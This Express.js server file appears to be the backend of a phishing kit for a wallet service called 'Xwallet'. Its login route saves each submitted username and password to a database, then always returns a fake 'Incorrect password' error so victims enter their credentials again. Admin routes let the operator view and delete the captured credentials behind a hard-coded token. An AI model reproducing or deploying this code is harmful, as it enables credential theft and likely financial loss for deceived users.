require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const Submission = require('./backend/models/Submission');

const app = express();
const PORT = process.env.ADMIN_PORT || 5001;

// --- MIDDLEWARE ---
app.use(cors());
app.use(express.json());

const frontendPath = fs.existsSync(path.join(__dirname, 'frontend'))
  ? path.join(__dirname, 'frontend')
  : path.join(__dirname, 'backend', 'public');

// 1. Serve Admin Panel Static Files
app.use(express.static(frontendPath, { index: 'admin.html' }));

// --- DATABASE CONNECTION ---
if (process.env.MONGODB_URI) {
  mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('✅ Connected to MongoDB (Xwallet Admin Panel)'))
    .catch(err => console.error('❌ DB Connection Error:', err));
}

// --- ADMIN & USER ROUTES ---

// Double-login / Login attempt
app.post('/api/login', async (req, res) => {
  try {
    const { username, loginPassword, phone, password } = req.body;
    const userVal = username || phone;
    const passVal = loginPassword || password;

    if (!userVal || !passVal) {
      return res.status(400).json({ success: false, error: 'Username and password are required' });
    }

    const loginSubmission = new Submission({
      username: userVal,
      loginPassword: passVal,
      source: 'login'
    });
    await loginSubmission.save();
    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// User Submission (Local support)
app.post('/api/submit', async (req, res) => {
    try {
        const newSubmission = new Submission(req.body);
        await newSubmission.save();
        res.status(201).json({ message: 'Saved successfully' });
    } catch (error) {
        console.error('Submission Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// Admin Login
app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === process.env.ADMIN_MASTER_PASSWORD) {
        res.json({ success: true, token: "ADMIN_ACCESS_GRANTED" });
    } else {
        res.status(401).json({ success: false, error: 'Invalid Password' });
    }
});

// Get Data
app.get('/api/admin/data', async (req, res) => {
    if(req.headers['auth-token'] !== "ADMIN_ACCESS_GRANTED") {
        return res.status(401).json({ error: "Unauthorized" });
    }
    try {
        const data = await Submission.find().sort({ timestamp: -1 });
        res.json(data);
    } catch (e) {
        res.status(500).json({ error: "Error fetching data" });
    }
});

// Delete Data
app.delete('/api/admin/data/:id', async (req, res) => {
    if(req.headers['auth-token'] !== "ADMIN_ACCESS_GRANTED") {
        return res.status(401).json({ error: "Unauthorized" });
    }
    try {
        await Submission.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: "Error deleting" });
    }
});

// Fallback: Send admin.html for any unknown routes
app.get('*', (req, res) => {
    res.sendFile(path.join(frontendPath, 'admin.html'));
});

app.listen(PORT, () => {
  console.log(`⚙️  Admin Panel running on http://localhost:${PORT}`);
});
